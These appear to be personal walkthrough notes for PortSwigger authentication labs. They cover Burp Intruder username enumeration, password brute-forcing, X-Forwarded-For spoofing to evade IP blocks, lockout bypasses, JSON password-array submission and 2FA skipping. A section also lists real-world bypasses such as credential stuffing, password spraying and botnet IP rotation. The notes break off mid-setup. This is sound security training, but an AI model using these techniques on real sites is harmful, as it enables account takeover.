# **🛡️ PortSwigger Authentication Labs Walkthrough/writeups**

**🙏** Welcome to my personal notes on authentication-related challenges and labs on https://portswigger.net/web-security/authentication .These notes are written from scratch based on techniques I practiced.

## **🔐 Lab: Username Enumeration via Different Responses**

### **🎯 Goal:**

Identify a **valid username** and then **brute-force the password** using response differences.

### **🧭 Step-by-Step Guide**

#### **🧪 Step 1: Visit the Login Page**

* Open the lab and go to the login page.  
  Enter a random username (randomUser) and password (123456).  
* Submit the form.

#### **🔍 Step 2: Intercept the Request in Burp**

* Open **Burp Suite**.  
* Go to **Proxy \> HTTP history**.  
* Find the POST /login request.  
* **Right-click → Send to Intruder**.

#### **🎯 Step 3: Enumerate Usernames**

* In the Intruder **\> Positions tab**, clear all auto-set positions.  
* Highlight only the **username** field and click **"Add §"**.

Example:

username=§testuser§\&password=wrongpass

* Go to **Payloads tab**:

  * Payload type: **Simple list**  
  * Paste the **username list** from the lab.

#### **🚀 Step 4: Start the Attack**

* Click **Start Attack**.  
* In results, look for:  
  * Different **lengths** or **status codes**  
  * Or a different **response message** like:  
    * "Invalid password" (means username is valid\!)  
    * "Invalid username" (means not valid)

✅ **Result**: You’ll identify a valid user, like., adkit.

#### **🔁 Step 5: Brute-force the Password**

* Reuse the same login request in **Intruder**.  
* This time, place payload markers around the **password**.

Example:

username=adkit\&password=§guesspass§

* Go to **Payloads** tab:  
  * Paste the **password list** from the lab.

#### **🚀 Step 6: Start the Attack Again**

* Click **Start Attack**.  
* Look for:

  * A different **length**  
  * Or response saying **“Welcome”**, or redirects to account/dashboard.

✅ Now you have the **correct password**\!

#### **🔐 Step 7: Log In**

* Right-click the valid response → **Show response in browser**.  
* Log in with:

  * Username: the valid one you found  
  * Password: the correct one from brute-force

### **💥 Boom\! Lab is Solved ✅**

### **🔍 Key Takeaways**

* ❗ Different login error messages expose **valid usernames**.  
* 🛠 Burp Suite can automate finding valid usernames and passwords using **Intruder**.  
* ⚠️ It's a **logic flaw** that leaks sensitive information through response differences (text, length, status).  
* 🔒 Secure apps should return the **same error message** for all login failures.  
* 🚫 Prevent with **generic errors**, **rate limiting**, and **monitoring**.

## **🔐 Lab: Username Enumeration via Subtly Different Responses**

**🎯 Goal:** Identify a valid username (based on minor differences in error messages) and brute-force the correct password.

---

### **🧭 Step-by-Step Guide**

#### **✅ Step 1: Submit an Invalid Login**

* Open the lab in your browser with **Burp Suite running**.  
* Enter a **random username** and **random password** in the login form.  
* Intercept the request with **Burp Proxy**, and:  
  * **Right-click** → **Send to Intruder**.

#### **✅ Step 2: Configure Burp Intruder for Username Enumeration**

* In **Intruder \> Positions**, confirm that only the **username** is marked with `§`.  
* In the **Payloads** tab:  
  * Select **Payload Type: Simple list**.  
  * Paste the **candidate usernames** from the lab.

#### **✅ Step 3: Use Grep \- Extract to Detect Subtle Differences**

* Go to the **Settings** tab (right panel).  
* Under **Grep \- Extract**, click **Add**.  
* In the response preview:  
  * **Scroll to the error message** (e.g., `Invalid username or password.`).  
  * **Highlight the entire message** with your mouse.  
  * Click **OK** (Burp auto-fills the offset).  
* Start the attack by clicking **Start Attack**.

#### **🔍 Step 4: Analyze Results to Find the Valid Username**

* Once the attack finishes, look at the new column.  
* Sort the results by this column.  
* You’ll find one entry with a **slightly different** message:  
  * Invalid username or password \</p\> and others will Invalid username or password   
* ✅ This indicates a **valid username**.  
* **Send it to the intruder.**

#### **🔑 Step 5: Brute-force the Password**

* Go back to **Intruder**.

* In **Positions**:  
  * Replace the username with the valid one you just found.

Set the `§` payload marker around the **password** value.  
`username=username_that_you_got&password=§password§`

* In the **Payloads** tab:  
  * Clear the old list.  
  * Paste the **candidate passwords**.  
* Click **Start Attack**.

#### **🟢 Step 6: Identify the Valid Password**

* When the attack completes:  
  * Check for the length, the different length is the password.  
  * You will get HTTP/2 302 Found.

#### **🎉 Step 7: Log In**

* Return to the login page.  
* Enter the **valid username** and **valid password**.  
* Or choose  Show response in browser.

✅ **Lab Solved\!**

**Grep-Extract**

Grep extract of burp intruder is used when the server **tries to hide** whether the username or password is incorrect, by giving a **generic error message** like:

Invalid username or password.

So We use **Grep \- Extract** to **pull out the exact error message** and compare it across all responses. That’s how we spot the **one username** that gets a **slightly different message**, revealing it’s valid.

When the difference is **too small for response length or status code to catch**, **Grep \- Extract** becomes the best way to detect it.

## **🧪 Lab: Username Enumeration via Response Timing**

### **🎯 Goal:**

This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.   

The application **tries to hide** whether the username is valid — but it accidentally leaks information based on how **long** it takes to respond.

### **⌛ Core Idea: Timing Side Channel**

When you send:

`POST /login`  
`username=someuser&password=verylongpassword...`

The app behaves differently depending on the **validity of the username**:

| Case | Behavior |
| :---- | ----- |
| ❌ Invalid username | Rejects **immediately** (no password hash check) → **Fast response** |
| ✅ Valid username | Attempts to verify password → **Slower response**, especially for **long passwords** |

This difference in response time becomes the **“subtle leak”** that you can measure.

### **1️⃣ Submit a Login Request**

* Go to the login page of the lab.  
* Enter any **random username and password**, e.g.:  
   `username=abcd&password=123456`  
* Intercept the request in **Burp Suite** → **Send it to Repeater**.

###     **2️⃣ Notice IP-Based Brute-force Protection**

* If you submit too many login attempts, the server **blocks your IP**.  
* This lab supports the **`X-Forwarded-For` header**.  
   🔐 Use this header to **spoof your IP** and bypass rate-limiting.

####     **3️⃣ Observe the timing difference manually**

* In Repeater, try:  
  * `username=anyuser_name` with a long password (e.g., 100 chars)  
  * Then try a **real username** (your lab username) with the same long password which is given for testing(`wiener)`.  
* Notice the difference(in milliseconds):  
  * **Invalid username** → Fast response  
  * **Valid username** → Slow response

####     **4️⃣ Send request to Burp Intruder and use Pitchfork attack**

* Send the request to the Intruder.  
* Add `X-Forwarded-For` header to spoof IP like  
  Referer: https://0a3f001d032f80b3c0a545db00bd0083.web-security-academy.net/login  
  Upgrade-Insecure-Requests: 1  
  Sec-Fetch-Dest: document  
  Sec-Fetch-Mode: navigate  
  Sec-Fetch-Site: same-origin  
  Sec-Fetch-User: ?1  
  Dnt: 1  
  Sec-Gpc: 1  
  Priority: u=0, i  
  Te: trailers  
  X-Forwarded-For:100  
  username=eh\&password=carlos+root+admin+test+guest+info+adm+mysql+user+administrator+oracle+ftp+pi+puppet+ansible+ec2-user+vagrant+azureuser+academico+acceso+access+accounting+accounts+acid+activestat+ad+adam+adkit+admin+administracion+administrador+administrator+administrators+admins+ads+adserver+adsl+ae+af+affiliate+affiliates+afiliados+ag+agenda+agent+ai+aix+ajax+ak+akamai+al+alabama+alaska+albuquerque+alerts+alpha+alterwind+am+amarillo+americas+an+anaheim+analyzer+announce+announcements+antivirus+ao+ap+apache+apollo+app+app01+app1+apple+application+applications+apps+appserver+aq+ar+archie+arcsight+argentina+arizona+arkansas+arlington+as+as400+asia+asterix+at+athena+atlanta+atlas+att+au+auction+austin+auth+auto+autodiscover  
    
* Set **payload positions** on:  
  * The **username**  
  * The **X-Forwarded-For** header, set it to 100 as payload has 100 usernames.  
* **Payload position 1 (X-Forwarded-For):**  
  * Payload type: Numbers → Range 1 to 100   
* **Payload position 2 (username):**  
  * Paste the list of candidate usernames

####     **5️⃣ Start the attack and analyze timing** 

* Look for the row with the **longest response time** → that’s the **valid username**.  
* Repeat to confirm consistency(optional).

####     **6️⃣ Brute-force the password for the valid username**

* Send request to Intruder.

* Use the same IP spoofing setup.

* Add payload positions for:  
  * `X-Forwarded-For`  
  * `password`  
* Fix the username (now you know it).  
* Use a password wordlist in the second payload position.

####    **7️⃣Start the attack and find the correct password**

* Look for a **302 redirect** → this means successful login.  
* Note the correct password.

####    **8️⃣ Log in with the valid credentials**

* Use the valid **username and password** in the login form.  
* You’re redirected to the account page.  
* Or use show response in the browser.

**💥Boom You solved the lab**

### **🔧 Why use Burp Intruder \+ Pitchfork here?**

You’re doing a **two-variable attack**:

* `username or password`: changes per attempt (trying to find valid one)  
* `X-Forwarded-For`: changes to **spoof the IP** so you don’t get blocked

So:

* Use **Pitchfork mode** to **pair each spoofed IP** with a **username**  
* Long password (\~100 characters) is used to **amplify the delay** if the username is valid

### **Burp Intruder X-Forwarded-For**

### The "X-Forwarded-For" (XFF) header in Burp Suite is used to spoof the client's IP address when testing web applications. By adding or modifying this header in Burp's proxy, testers can simulate requests from different IP addresses, bypass IP-based restrictions, and assess how applications handle potentially untrusted client IP information.

### **🧠 Why it's Important in Labs (and Real Attacks)**

Normally, when you make a request to a web server:

* The **server sees your real IP** (e.g., `203.0.113.5`).  
* If you send too many login attempts, the server might **block your IP** to prevent brute-force attacks.

But if the server **trusts the `X-Forwarded-For` header**, you can **spoof your IP address** by changing the value of this header.  
 This **bypasses rate limiting or blocking**, because each request appears to come from a "different" IP.

### **🔓 Example:**

#### **Real Request:**

http  
CopyEdit  
`POST /login HTTP/1.1`  
`Host: vulnerable-site.com`  
`...`

`username=admin&password=wrongpass`

#### **Spoofed Request:**

http  
CopyEdit  
`POST /login HTTP/1.1`  
`Host: vulnerable-site.com`  
`X-Forwarded-For: 1.1.1.1`  
`...`

`username=admin&password=wrongpass`

On the next request, you can spoof again:

`X-Forwarded-For: 2.2.2.2`

So every login attempt seems to come from a different IP.  
 👉 This tricks the server's brute-force detection system.

### **🧪 Use case:**

* Username Enumeration via Response Timing  
* Brute-force Protection via IP Blocking  
* 2FA Bypass with Rate Limit on IP

### **⚠️ Important:**

* This only works if the **web application or proxy** **doesn’t validate or sanitize** the `X-Forwarded-For` header.  
* Many **modern servers** are smart enough to **ignore spoofed IP headers** unless coming from trusted proxies.

## **Flawed brute-force protection**

It is highly likely that a brute-force attack will involve many failed guesses before the attacker successfully compromises an account. Logically, brute-force protection revolves around trying to make it as tricky as possible to automate the process and slow down the rate at which an attacker can attempt logins. **The two most common ways of preventing brute-force attacks are:**

* Locking the account that the remote user is trying to access if they make too many failed login attempts  
* Blocking the remote user's IP address if they make too many login attempts in quick succession

# Both approaches offer varying degrees of protection, but neither is invulnerable, especially if implemented using flawed logic.

# For example, you might sometimes find that your IP is blocked if you fail to log in too many times. In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully.This means an attacker would simply have to log in to their own account every few attempts to prevent this limit from ever being reached. 

#  

# **Lab: Broken brute-force protection, IP block**

## **🎯 Goal: Brute-force Carlos's password**

➡️ Challenge: IP gets blocked after 3 failed login attempts  
 ➡️ Flaw: Logging in to your own account resets the failed attempt counter

## **🛠️ Step-by-Step Instructions**

---

### **✅ 1\. Open the Lab**

Log in with your own credentials given for testing:  
`username: wiener`  
`password: peter`

### **🧪 2\. Test the login rate-limiting**

Try **3 wrong logins** for `carlos`, like:  
 makefile  
CopyEdit  
`username: carlos`  
`password: wrong1`  
After 3 tries, the server blocks your IP:

"You have made too many incorrect login attempts. Please try again in 1 minute(s)".

**The X-Forwarded-For is sanitized so we cannot use this method here.**

### **🔍 3\. Discover the flaw**

* Try logging in with testing credentials again (`wiener:peter`)  
* You'll see it works\! ✅

👉 This **resets the IP block counter**.

💡 **Flaw**: The block counter resets if a *valid* login is made from the same IP under the given time to try again.

### **🧰 4\. Prepare Burp Intruder attack**

* Go to the login page.  
* Submit a wrong login:  
  `username=carlos&password=wrongpass`  
* In Burp, **intercept** the request and **send it to Intruder.**

### **🧨 5\. Set Payload Positions (Pitchfork Attack)**

#### **Intruder \> Positions:**

Replace the body with:

`username=§user§&password=§pass§`

Attack Type: **Pitchfork**

### **⚙️ 6\. Payloads Configuration**

#### **📌 Payload Set 1 (`user`):**

Make a list alternating between `wiener` and `carlos` like:

`wiener`  
`carlos`  
`wiener`  
`carlos`  
`wiener`  
`carlos`  
`...`

Repeat this until `carlos` appears at least 100 times.

💡 `wiener` should appear before each `carlos`.

**Logic :**The idea is simple alternate wiener,carlos because if we keep only carlos then it will be blocked. 

#### **📌 Payload Set 2 (`pass`):**

`peter`  
`123456`  
`peter`  
`password1`  
`peter`  
`abc123`  
`...`

Repeat `peter` before every real password guess for `carlos`.

Same reason for alternate password as in payload 1\.

⛳ This ensures **wiener logs in after every 1 failed Carlos attempt**, resetting the IP block counter.

### **🧵 7\. Enable Sequential Requests**

* In Intruder → **Resource Pool**  
* Set **Max concurrent requests \= 1**

📌 This is **important** to maintain correct request order.

### **🚀 8\. Start the Attack**

* Start attack  
* Wait for results

### **🔎 9\. Analyze Results**

* In Intruder Results:  
  * Click **Columns \> Status Code**  
  * Filter out all **200 responses**  
  * Look for **302 Found** → This indicates **successful login**

✅ You’ll find one response where `username=carlos` got a **302**.

That’s the correct password\!

### **🔐 10\. Log in as Carlos**

* Use that password with `carlos`  
* Access the **Account page**

**💥Boom** **Lab Solved\!**

### **Account locking**

One way in which websites try to prevent brute-forcing is to lock the account if certain suspicious criteria are met, usually a set number of failed login attempts. Just as with normal login errors, responses from the server indicating that an account is locked can also help an attacker to enumerate usernames. 

## **🔓 Objective:**

Exploit a logic flaw in **account lockout protection** to:

1. 🕵️ Identify a **valid username** (via different server behavior).  
2. 🔑 Brute-force that user’s **password** (despite account lockout).  
3. ✅ Log in and solve the lab.

## **✅ Step-by-Step Breakdown**

### **🧪 Step 1: Test a login manually**

* Open the lab in your browser.  
* In the login form, enter:  
  * Username: `invalidUser`  
  * Password: `anything`  
* Click **Login**.  
* Capture the request in **Burp Suite** (HTTP history tab).  
* **Send to the Intruder**.

### **🎯 Step 2: Username Enumeration via Burp Intruder**

#### **Intruder Setup:**

* **Attack Type**: `Cluster bomb`

Modify POST body to this:  
`username=§username§&password=example§§`

*  You are marking:  
  * `username` for testing different usernames  
  * `password` with a blank payload, repeated 5 times (to trigger account lock)

#### **Payloads:**

* Payload set 1:  
  * Load candidate usernames (e.g., `usernames.txt`)  
* Payload set 2:  
  * Payload type: `Null payloads`  
  * Number: `5`

  #### **💡 Why?**

This sends **5 login attempts per username**:

* For **invalid usernames**, nothing special happens — same error each time.  
* For a **valid username**, the system shows:  
  “You have made too many incorrect login attempts. Please try again in 1 minute(s).”

#### **Add Grep Extract:**

* Go to **Options \> Grep \- Extract**  
* Add extraction, select invalid username or password

This will help identify which response **does not contain any error** (a successful login).

**Valid usernames** will eventually show:  
 *“You have made too many incorrect login attempts.Please try again in 1 minute(s).”*

#### **Analyze Responses:**

* Sort or look for the **different error message i.e** *You have made too many incorrect login attempts.Please try again in 1 minute(s)* invalid will .  
* ✅ **That username is valid. Write it down.**

### **🔐 Step 3: Brute-force the password**

Now that we know a **valid username**, try to crack the password.

**Intruder Setup:**

* Send the response of the valid username to the intruder.  
* Change attack type to: **Sniper.**  
* Set the payload to password and set the same Extract-match as earlier. 

#### **Start Attack:**

* In the results, look at the grep extract column and notice that there are a couple of different error messages,  i.e invalid username or password  — that’s the correct password.

* ⚠️ You may hit the lockout — **wait 1–2 minutes**.

### **✅ Step 4: Login manually**

* Wait a minute for the lockout to reset.  
* Login with valid username and password:  
  You’ll be logged in and redirected to `/my-account`.  
  **💥Boom Lab Solved\!**

## **🔥 What is Cluster Bomb in Burp Suite?**

## **Cluster Bomb** is an **Intruder attack type** that:

* ## Tests **all combinations** of payloads at **multiple positions**.

### **![][image1]**

### 

### **💡 Use Case: This Lab ("Username enumeration via account lock")**

## We want to:

| Goal | Explanation |
| :---- | :---- |
| 🔍 Test **many usernames** |  To find which one is **valid** |
| 🔁 Send **5 requests per username** | Because valid usernames get **locked out after 5 failed attempts for wrong password** |

## **✅ Why Cluster Bomb is used here**

We need **two payload positions**:

1. **Username** (payload set 1\)  
   * A list of possible usernames: `carlos`, `alice`, `bob`, etc.

2. **Blank (null) payload** (payload set 2\)  
   * Just a dummy value so Burp sends each username **5 times**.

### **🔧 Example setup:**

In Burp Intruder:

`POST /login HTTP/1.1`  
`...`  
`username=§USERNAME§&password=example§§`

### **Resulting behavior:**

Burp will send:  
`carlos + blank`  
`carlos + blank`  
`carlos + blank`  
`carlos + blank`  
`carlos + blank`

`alice + blank`  
`alice + blank`  
`alice + blank`  
`alice + blank`  
`alice + blank`  
`...`

Each username gets **5 login attempts**, which will **trigger the lockout** only if the username is **real**.

### **🔎 Then what?**

In the responses:

* **Invalid usernames** → same error message every time.  
* **Valid username** → after 5 tries → you get:  
   "You have made too many incorrect login attempts..."

Boom\! You now know **which username is real** ✅

## **🔍 How to Know an Account is Locked (Real World Techniques)**

### **1\. Look for Different Response Messages**

When testing multiple usernames:

* Invalid usernames → consistently return generic error (e.g., `Invalid username or password`)  
* **Valid usernames** → after repeated attempts return something like:  
  * `"Too many failed login attempts, try again later"`  
  * `"Account temporarily locked"`

✅ That’s your signal the username is **valid** and **locked**

## **🔐 1\. Why Account Locking Isn't Foolproof**

### **🧪 What It Does:**

* After N failed attempts (e.g., 3), **lock the account temporarily** (e.g., for 1 minute).

### **🔓 How Attackers Bypass It:**

#### **✅ By targeting many users lightly instead of one user heavily.**

### **🧠 Attack Strategy (Smart Brute Force):**

1. Build a **list of candidate usernames** (from leaks, patterns, etc.).  
2. Choose **just a few common passwords** (e.g., `"123456"`, `"password"`, `"qwerty"`).  
3. Send each password attempt **only once per user**.

🔄 This avoids triggering any lockout but may still succeed if **any user** has a weak password.

⚠️ Account lockout protects **individual accounts**, not the whole system.

## **🧨 2\. Credential Stuffing Bypasses Account Lockout Too**

### **🧪 What It Is:**

* Use real username:password combos from **data breaches** (e.g., from Pastebin, combo lists).

### **🔓 Why It Works:**

* Only 1 attempt per account → no lockout.  
* **High success rate** due to password reuse across websites.

✅ Account lockout is useless here — you're not brute-forcing, you're just **trying credentials that already exist**.

## **🛡️ 3\. What About User Rate Limiting?**

### **🧪 What It Does:**

* Detects excessive login attempts from a **single IP address**.  
* Blocks IP temporarily or until CAPTCHA is solved.

### **🔓 How It Can Be Bypassed:**

* **IP rotation** (proxy lists, VPNs, Tor)  
* **X-Forwarded-For header spoofing** (some sites respect this)  
* Use **distributed botnets** (each IP does a small part of the job)  
* Use **password spray** tactics with low rates  
  🎯 It protects the **infrastructure**, not individual accounts.

## **🧠 Summary: Real-World Pentester Mindset**

| Protection | What it blocks | How to bypass |
| ----- | ----- | ----- |
| 🔐 Account Locking | Brute force on a single account | Target many users, use few passwords |
| 🛡️ IP Rate Limiting | High rate from one IP | Use IP rotation or spoof headers |
| 🎭 CAPTCHA / MFA | Bots | More difficult, but CAPTCHA solvers exist |

## **🔧 Effective Mitigations (For Defenders)**

* **CAPTCHA** after a few attempts  
* **Multi-Factor Authentication (MFA)**  
* Monitor for **credential stuffing behavior** (anomalous geolocation, patterns)  
* **Device fingerprinting** instead of IP-based tracking  
* **Login throttling** rather than full lockout

# **JSON format bypass**

# **Lab: Broken brute-force protection, multiple credentials per request**

### **🧠 Goal**

Exploit a logic flaw in the login endpoint that processes an array of passwords — stopping brute-force detection.

### **✅ Step-by-Step Guide**

#### **1\. Open the Lab**

* Click **"Access the Lab"**.

**2\. Capture Login Request**

* Go to the **login page** on the lab site.  
* Enter:  
  * Username: `carlos`  
  * Password: `anything` (a dummy value)  
* Intercept this request in **Burp Proxy**.

You’ll see a `POST /login` request with a **JSON format** like:

`{`  
  `"username": "carlos",`  
  `"password": "wrongpass"`  
`}`

* 

---

#### **3\. Send to Repeater**

* Right-click the request → **Send to Repeater**.  
* Go to the **Repeater** tab.

#### **4\. Modify the JSON Password Field**

Create the password list  in json a JSON **array format,** which is given in the lab like:  
`{`  
  `"username":"carlos","password":[`  
  `"123456",`  
  `"password",`  
  `"12345678",`  
  `"qwerty",`  
  `"123456789",`  
  `"12345",`  
    `...`  
  `]`  
`}`

#### **5\. Send the Request**

* Click **Send** in Burp Repeater.  
* Look at the response:  
  * If you get **HTTP 302 Found**, that means login **succeeded**.  
  * Look for a **Set-Cookie** header with `session` or `auth` token.

#### **6\. Access the Logged-in Page**

* Right-click → **Show Response in Browser** → **Copy URL**.  
  Paste this URL in your browser.  
* You’ll be logged in as **Carlos**.

**💥Boom solved the lab**

### **💡 Why This Works**

The server **naively iterates over the array of passwords** and authenticates if **any** one matches, **without triggering rate-limiting or brute-force defenses**. This bypasses traditional brute-force protections expecting one credential per request.

## **✅ Why Repeater over Intruder for Json format**

In most real-world scenarios, **JSON-based authentication** bypass—especially for **API endpoints** or **AJAX-backed login forms**—is best tested and exploited using **Burp Suite Repeater**, not Intruder

**Intruder sends one password per request**.  
That triggers the server's **brute-force detection** after a few attempts (e.g., lockout, CAPTCHA, rate limit).  
It also doesn’t support sending a **single crafted JSON array** easily without complex configuration or extensions.

### **✅ Why Repeater works:**

You only send **one** request.That request contains a JSON array of all candidate passwords.  
The server loops through the array internally — **no rate-limiting is triggered**.  
Repeater is perfect for manually crafting this kind of non-standard, logic-based exploit.

## **What Is HTTP Basic Authentication?**

In HTTP basic authentication, the client receives an authentication token from the server, which is constructed by concatenating the username and password, and encoding it in Base64.This token is stored and managed by the browser, which automatically adds it to the `Authorization` header of every subsequent request.

It's a simple authentication scheme using the Authorization header:  
Authorization: Basic base64(username:password)

No session management or cookies involved — the browser sends this header **with every request** to the same realm.

## **🚨 Why It's Insecure**

### For a number of reasons, this is generally not considered a secure authentication method.

### **1\. Credentials Sent with Every Request**

Since the Authorization header contains the raw base64-encoded, it involves repeatedly sending the user's login credentials with every request .Unless the website also implements HSTS, user credentials are open to being captured in a man-in-the-middle attack.   
**Base64 is not encryption** — it’s trivially reversible.

### **2\. No Brute-force Protection by Default**

### **3\. Vulnerable to MITM (If No HTTPS or No HSTS)**

If the site doesn’t enforce **HTTPS (via HSTS)**, credentials can leak over the network via HTTP.  
**HSTS (HTTP Strict Transport Security)** forces clients to use HTTPS, reducing this risk.

### **4\. No Built-in CSRF Protection**

Since the browser automatically sends the `Authorization` header to any request matching the domain:

* **No CSRF tokens or validation steps exist** in Basic Auth.

  ### **5\. Credential Reuse Risk**

  Even if the page being protected isn’t sensitive, leaked credentials may be reused:

  * Internal admin panels  
  * APIs  
  * External services (if the same credentials are used elsewhere)

## **🛡️ Mitigation Best Practices**

* Avoid Basic Auth for anything sensitive.  
* Use **OAuth**, **JWT**, or session-based login with CSRF protection.  
* Always enforce HTTPS via **HSTS**.  
* Implement rate-limiting and lockout on repeated failures.

## **🔍 How to Identify HTTP Basic Authentication**

When you're doing reconnaissance or browsing a target:

### **✅ Indicators of HTTP Basic Auth:**

1. **Browser popup** asking for username and password (instead of a login form).

   HTTP response header:

   HTTP/1.1 401 Unauthorized

          WWW-Authenticate: Basic realm="Secure Area"

2. Requests from browser include a header like:

   Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=

   	→ You can decode this with:  
echo "dXNlcm5hbWU6cGFzc3dvcmQ=" | base64 \-d

\# Output: username:password

# 

# 

# 

# 

### **🔐 Multi-Factor Authentication (MFA)?**

**Multi-Factor Authentication (MFA)** is a **security process** that requires users to present **two or more independent pieces of evidence (factors)** to verify their identity before gaining access to a system or service.

**It is based on something you know(**Password,PIN,Security question answer**) and something you have (**Mobile phone (for receiving OTP or push notification), Hardware token (like a YubiKey), Smart card, Authenticator app (generating TOTP codes)**).**

**✅ Why MFA?**

Passwords alone are vulnerable to:

* Phishing  
* Credential stuffing  
* Brute-force attacks  
* Data breaches

**MFA adds an extra layer of defense**, making it much harder for attackers to gain unauthorized access, even if they steal a password. However, as with any security measure, it is only ever as secure as its implementation. Poorly implemented two-factor authentication can be beaten, or even bypassed entirely, just as single-factor authentication can.

 Email-based 2FA is one such example.

## **🔍 The Three Types of Authentication Factors**

MFA typically combines **at least two** of the following:

| Factor Type | Description | Examples |
| ----- | ----- | ----- |
| **Something You Know** | A secret the user memorizes | Password, PIN, answer to security question |
| **Something You Have** | A physical object in the user’s possession | Smartphone, security token, smart card |
| **Something You Are** | A physical trait of the user | Fingerprint, face scan, retina scan |

**Example**: Logging in with a password (something you know) and a code from your phone (something you have).

## **🧠 How MFA Works (Typical Flow)**

1. User enters **username and password**.

2. System prompts for a second factor:

   * OTP code  
   * Push approval  
   * Biometric scan  
   * Security key tap

3. If both factors are correct → **access granted**.

### **🔐 Two-Factor Authentication (2FA) Tokens**

A **2FA token** is a **physical or digital object** used as the **“something you have”** factor in a **two-factor authentication** setup. It generates or delivers a **one-time passcode (OTP)** or verifies your identity alongside your password (the “something you know”).

 In addition to being purpose-built for security, these dedicated devices also have the advantage of generating the verification code directly. 

## **✅ Types of 2FA Tokens**

### **1\. Software Tokens**

Tokens generated by apps on a phone or device

🟢 **Examples:**

* Google Authenticator  
* Microsoft Authenticator  
* Authy  
* FreeOTP

### **2\. Hardware Tokens**

Dedicated physical devices that generate OTPs.

**Many high-security websites now provide users with a dedicated device** for this purpose, such as the **RSA token or keypad device,hardware keypads** that you might use to access your online banking or work laptop.

**How they work:** These generate Time-Based One-Time Passwords (TOTP) directly on the device.

🔐 **Examples:**

* RSA SecurID  
* FortiToken  
* HID Global  
* SafeNet token

🕒 Usually based on:

* **TOTP**: like software tokens, synced via time  
* **HOTP**: event-based, code changes when button is pressed

✅ **Pros:**

* Does not depend on internet or smartphone  
* Resistant to malware on mobile devices

### **3\. U2F/FIDO2 Security Keys**

**Phishing-resistant** hardware tokens used via USB, NFC, or Bluetooth

🔑 **Examples:**

* YubiKey  
* Google Titan Key  
* SoloKey

### **4\. SMS or Email OTP Tokens *(not recommended for strong security)***

* You receive a **code via SMS** or **email** after entering your password.  
* Easy to implement, but weak due to:  
  * SIM swap attacks  
  * Email compromise  
  * Interceptable messages

---

## **🚨 Bypassing Two-Factor Authentication: Common Flaws**

### **1\. Broken Authentication Flow (Session Mismanagement)**

* **Description:** If a system creates a session or token after the user enters only their **username and password**, and before verifying the second factor, then the user is already "partially authenticated."

* **Attack Method:** An attacker who has stolen valid credentials may:

  * Submit the username and password

  * Skip the 2FA prompt

  * Attempt to directly access URLs or endpoints intended for logged-in users

* **Result:** If the system fails to enforce 2FA completion at each step, the attacker gains access without ever providing the second factor.

### **2\. Missing 2FA Enforcement on Sensitive Endpoints**

* **Description:** Developers may secure the login flow but **forget to protect APIs, internal routes, or secondary login mechanisms**.

* **Attack Method:** After logging in with credentials, an attacker manually navigates to protected routes (like `/dashboard` or `/account`) via crafted requests.

* **Example:** An attacker uses a proxy (like Burp Suite) to intercept and modify HTTP requests after login, skipping 2FA checks.

### **3\. Insecure Token/Session Issuance**

* **Description:** If session tokens are issued **before 2FA is verified**, they may be reused to access protected resources.

* **Attack Method:**

  * Log in with just a password

  * Capture the session token from the response

  * Reuse that session token in another request, bypassing the second step

# **Lab: 2FA simple bypass**

**Goal 🎯**

This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code.

 This **2FA simple bypass** lab is designed to teach a **common logic flaw**: when a website **doesn’t properly enforce 2FA server-side** .

## **✅ Step-by-Step Walkthrough**

### **🔓 1\. Login as your own user**

* Go to the login page.

Enter your credentials given in the lab:  
`Username: wiener`

`Password: peter`

Submit the form

### **📧 2\. Check your email**

* The site will prompt for a 2FA code.  
* Click the **"Email client"** button.  
* You will receive an email with your code. (This simulates real 2FA via email.)

But **you don't need to enter the code now** — instead:

### **👤 3\. Go to /my-account**

While still logged in, change the browser URL to:  
`https://<your-lab-id>.web-security-academy.net/my-account`

* You will be taken directly to your account page — *without entering the 2FA code*.  
* This shows the 2FA is **not enforced on backend routes**, just UI-side.

### **🔐 4\. Log out and Login as Carlos**

### Log out and Go back to the login page. Enter victim’s credentials : `Username: carlos  Password: montoya`

Submit the form.

You’ll now be asked for Carlos’s 2FA code (which you don’t have).DO NOT enter anything.

### **🚨 5\. Bypass 2FA**

In the browser address bar, replace the current URL with:

 perl  
CopyEdit  
`https://<your-lab-id>.web-security-academy.net/my-account`

* Hit Enter.

**💥 BOOM Lab Solved**

## **🔍 What did we learn?**

This is a **2FA logic flaw**:

* The 2FA verification step is **not enforced server-side**.  
* You can skip it by accessing protected endpoints directly.

## **Flawed two-factor verification logic**

Sometimes flawed logic in two-factor authentication means that after a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step.

For example, the user logs in with their normal credentials in the first step as follows:

`POST /login-steps/first HTTP/1.1 Host: vulnerable-website.com ... username=carlos&password=qwerty`

They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:

`HTTP/1.1 200 OK Set-Cookie: account=carlos GET /login-steps/second HTTP/1.1 Cookie: account=carlos`

When submitting the verification code, the request uses this cookie to determine which account the user is trying to access:

`POST /login-steps/second HTTP/1.1 Host: vulnerable-website.com Cookie: account=carlos ... verification-code=123456`

In this case, an attacker could log in using their own credentials but then change the value of the `account` cookie to any arbitrary username when submitting the verification code.

`POST /login-steps/second HTTP/1.1 Host: vulnerable-website.com Cookie: account=victim-user ... verification-code=123456`

This is extremely dangerous if the attacker is then able to brute-force the verification code as it would allow them to log in to arbitrary users' accounts based entirely on their username. They would never even need to know the user's password.         

# **Lab: 2FA broken logic**

# **Lab: 2FA bypass using a brute-force attack**

### **🎯 Goal:**

To bypass 2FA authentication by brute forcing.

Access **Carlos’s account** even though you don't have his 2FA code(4-digit security code) — by brute-forcing it in a smart way that works **despite login session resets**.

## **✅ Step-by-Step Solution**

### **🧪 Step 1: Login manually as Carlos**

* Go to the login page, Enter the given credentials:  
  `Username: carlos`  
  `Password: montoya`  
* You’ll be taken to a **2FA input page** (`/login2`).

### **🔄 Step 2: Create a Macro**

1. Go to:   
   `Burp Suite → Setting→ Project→ Session → Handling Rules`  
2. Click **Add**.

   ### **Configure the Rule to Run a Macro**

* In the **"Session Handling Rule Editor"**:

  * In **Rule Description**  
* Go to the **“Scope” tab**:

  * Choose: **“Include all URLs”**

* Go to the **“Details” tab**:

  * Click **Add → Run a Macro**  
3. Under **Select macro** click **Add** to open the **Macro Recorder**. Select the following 3 requests:  
4. GET /login  
5. POST /login  
6. GET /login2

Use to select requests:

* **Ctrl \+ Click** (Windows/Linux) or **Cmd \+ Click** (Mac) to select **multiple non-consecutive requests**.  
